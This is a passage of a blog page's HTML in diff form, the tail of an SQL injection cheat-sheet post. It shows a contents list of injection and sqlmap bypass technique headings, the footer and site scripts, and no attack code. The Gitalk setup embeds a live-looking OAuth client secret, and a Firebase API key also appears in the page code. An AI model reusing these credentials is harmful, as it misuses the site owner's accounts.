class="nav-number">1.5.3.</span> <span class="nav-text">过滤比较符号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#过滤了if"><span class="nav-number">1.5.4.</span> <span class="nav-text">过滤了if</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常见Bypass"><span class="nav-number">1.5.5.</span> <span class="nav-text">常见Bypass</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#各种骚姿势一把梭"><span class="nav-number">1.6.</span> <span class="nav-text">各种骚姿势一把梭</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#update、insert、delete注入"><span class="nav-number">1.6.1.</span> <span class="nav-text">update、insert、delete注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pow溢出报错"><span class="nav-number">1.6.2.</span> <span class="nav-text">pow溢出报错</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XOR注入"><span class="nav-number">1.6.3.</span> <span class="nav-text">XOR注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#regexp注入"><span class="nav-number">1.6.4.</span> <span class="nav-text">regexp注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#order-by盲注"><span class="nav-number">1.6.5.</span> <span class="nav-text">order by盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#无列名注入"><span class="nav-number">1.6.6.</span> <span class="nav-text">无列名注入</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sqlmap一把梭"><span class="nav-number">2.</span> <span class="nav-text">sqlmap一把梭</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基础指令一把梭"><span class="nav-number">2.1.</span> <span class="nav-text">基础指令一把梭</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tamper一把梭"><span class="nav-number">2.2.</span> <span class="nav-text">tamper一把梭</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">P2hm1n</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+  
+  <script color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.2"></script>
+
+  <script src="/js/motion.js?v=7.1.2"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/schemes/muse.js?v=7.1.2"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.2"></script>
+<script src="/js/post-details.js?v=7.1.2"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.2"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+    
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+
+
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '355064866eb0a9c2de67',
+    clientSecret: '2e624255d41f832c93f2b3d8d828ecb1020eac9c',
+    repo: 'Gitalk',
+    owner: 'P2hm1n',
+    admin: [''],
+    id: md5(location.pathname),
+    
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+  <script src="https://www.gstatic.com/firebasejs/4.6.0/firebase.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/4.6.0/firebase-firestore.js"></script>
+  
+  <script>
+    (function () {
+
+      firebase.initializeApp({
+        apiKey: 'AIzaSyCDQ4n4iCo1yBkV-vwZmbaCxR8JgT7zTi4',
+        projectId: 'blog-6ef40'
+      })
+
+      function getCount(doc, increaseCount) {
+        //increaseCount will be false when not in article page
+
+        return doc.get().then(function (d) {
+          var count
+          if (!d.exists) { //has no data, initialize count
+            if (increaseCount) {
+              doc.set({
+                count: 1
+              })
+              count = 1
+            }
+            else {
+              count = 0
+            }
+          }
+          else { //has data
+            count = d.data().count
+            if (increaseCount) {
+              if (!(window.localStorage && window.localStorage.getItem(title))) { //if first view this article
+                doc.set({ //increase count
+                  count: count + 1
+                })
+                count++
+              }
+            }
+          }
+          if (window.localStorage && increaseCount) { //mark as visited
+            localStorage.setItem(title, true)
+          }
+
+          return count
+        })
+      }
+
+      function appendCountTo(el) {
+        return function (count) {
+          $(el).append(
+            $('<span>').addClass('post-visitors-count').append(
+              $('<span>').addClass('post-meta-divider').text('|')
+            ).append(
+              $('<span>').addClass('post-meta-item-icon').append(
+                $('<i>').addClass('fa fa-users')
+              )
+              ).append($('<span>').text('阅读次数 ' + count))
+          )
+        }
+      }
+
+      var db = firebase.firestore()
+      var articles = db.collection('articles')
+
+      //https://hexo.io/docs/variables.html
+      var isPost = 'SQL注入一把梭'.length > 0
+      var isArchive = '' === 'true'
+      var isCategory = ''.length > 0
+      var isTag = ''.length > 0
+
+      if (isPost) { //is article page
+        var title = 'SQL注入一把梭'
+        var doc = articles.doc(title)
+
+        getCount(doc, true).then(appendCountTo($('.post-meta')))
+      }
+      else if (!isArchive && !isCategory && !isTag) { //is index page
+        var titles = [] //array to titles
+
+        var postsstr = '' //if you have a better way to get titles of posts, please change it
+        eval(postsstr)
+
+        var promises = titles.map(function (title) {
+          return articles.doc(title)
+        }).map(function (doc) {
+          return getCount(doc)
+        })
+        Promise.all(promises).then(function (counts) {
+          var metas = $('.post-meta')
+          counts.forEach(function (val, idx) {
+            appendCountTo(metas[idx])(val)
+          })
+        })
+      }
+    })()
+  </script>
+
+
+  
+
+  
+
+  
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  <script src="/js/wobblewindow.js"></script>
+  <script>
+    //只在桌面版网页启用特效
+    if( window.innerWidth > 768  ){
+      $(document).ready(function () {
+        
+          $('#header').wobbleWindow({
+            radius: 50,
+            movementTop: false,
+            movementLeft: false,
+            movementRight: false,
+            debug: false,
+          });
+        
+
+        
+          $('#sidebar').wobbleWindow({
+            radius: 50,
+            movementLeft: false,
+            movementTop: false,
+            movementBottom: false,
+            position: 'fixed',
+            debug: false,
+          });
+        
+
+        
+          $('#footer').wobbleWindow({
+            radius: 50,
+            movementBottom: false,
+            movementLeft: false,
+            movementRight: false,
+            offsetX: ,
+            position: 'absolute',
+            debug: false,
+          });
+        
+      });
+    }
+  </script>
+
+
+
+
+  <script src="/js/activate-power-mode.min.js"></script>
+  <script>
+    POWERMODE.colorful = true;
+    POWERMODE.shake = false;
+    document.body.addEventListener('input', POWERMODE);
+  </script>
+
+  <script type="text/javascript" src="/js/love.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
